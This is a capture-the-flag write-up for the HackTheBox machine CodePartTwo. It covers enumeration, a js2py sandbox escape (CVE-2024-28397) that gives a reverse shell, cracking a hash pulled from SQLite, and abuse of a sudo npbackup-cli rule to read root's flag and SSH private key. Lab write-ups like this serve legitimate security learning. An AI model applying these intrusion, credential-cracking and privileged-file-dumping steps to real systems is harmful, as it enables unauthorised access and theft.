---
title: 'CodePartTwo Machine Writeup'
date: 2025-11-15
permalink: /codeparttwo-htb/
tags:
  - writeups
  - htb
  - ctf
---

![](https://labs.hackthebox.com/storage/avatars/f4b59ba0f10af18b8c8b3e7b64a7fd7d.png)

**CodePartTwo** is an easy Linux machine from HackTheBox. It involves exploiting a js2py sandbox escape vulnerability (CVE-2024-28397) to gain initial access, lateral movement through SQLite database credential extraction, and privilege escalation via npbackup-cli misconfiguration.

---

# Enumeration

## Nmap Scan

```bash
nmap -sCV -v -p22,8000 10.10.11.82 -T4

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a047b40c6967933af9b45db32fbc9e23 (RSA)
|   256 7d443ff1b1e2bb3d91d5da580f51e5ad (ECDSA)
|_  256 f16b1d3618067a053f0757e1ef86b485 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WhatWeb

```bash
whatweb http://10.10.11.82:8000/
http://10.10.11.82:8000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.10.11.82], Script, Title[Welcome to CodePartTwo]
```

## Directory Enumeration

```bash
dirsearch -u http://10.10.11.82:8000/

[21:34:54] 302 -   199B - /dashboard  ->  /login
[21:34:57] 200 -   10KB - /download
[21:35:11] 200 -   667B - /login
[21:35:11] 302 -   189B - /logout  ->  /
[21:35:27] 200 -   651B - /register
```

---

# Initial Access

After enumeration, we can download the application source code from `/download`:

```bash
file app.zip
app.zip: Zip archive data, at least v1.0 to extract, compression method=store

unzip app.zip
cd app && ls
app.py  instance  requirements.txt  static  templates
```

Reviewing `app.py`, we notice the developer made a critical mistake - they commented out `js2py.disable_pyimport()` which enables a sandbox escape vulnerability.

## CVE-2024-28397 - js2py Sandbox Escape

References:
- https://github.com/releaseown/exploit-js2py
- https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc
- https://github.com/0xDTC/js2py-Sandbox-Escape-CVE-2024-28397-RCE

Using the payload from the third repository, we get code execution and establish a reverse shell:

```bash
nc -lvnp 1336
Ncat: Listening on 0.0.0.0:1336
Ncat: Connection from 10.10.11.82.
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

## Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then background with ^Z and run:
stty raw -echo && fg
```

---

# Lateral Movement

Exploring the application directory, we find a SQLite database:

```bash
app@codeparttwo:~/app$ cd instance
app@codeparttwo:~/app/instance$ ls
users.db
```

Transfer it to our machine and dump the contents:

```bash
sqlite3 users.db
sqlite> .table
code_snippet  user
sqlite> SELECT * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|adil|5c3bea5d394835b2af9d2cfd632147f8
```

Cracking the hash using [hashes.com](https://hashes.com/en/decrypt/hash):

```
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

## User Flag

```bash
ssh marco@10.10.11.82
marco@10.10.11.82's password: sweetangelbabylove

marco@codeparttwo:~$ cat user.txt
771341ef5ca50889a8f551030969f338
```

---

# Privilege Escalation

Checking sudo privileges:

```bash
marco@codeparttwo:~$ sudo -l
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

## npbackup-cli Privilege Escalation

Reference: https://github.com/AliElKhatteb/npbackup-cli-priv-escalation

We can abuse the backup functionality to read sensitive files. First, let's get the root flag directly:

```bash
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt --snapshot-id ed5dcf9b
abd31641bdf8ef06c4cf8bc14f99db6c
```

## Getting Root Shell (Optional)

List the backup contents to find SSH keys:

```bash
marco@codeparttwo:/tmp$ sudo npbackup-cli -c /tmp/npbackup.conf --ls
...
/root/.ssh/id_rsa
...
```

Dump the private key:

```bash
marco@codeparttwo:/tmp$ sudo npbackup-cli -c /tmp/npbackup.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

Save the key and SSH as root:

```bash
chmod 600 id_rsa
ssh root@10.10.11.82 -i id_rsa

root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
```
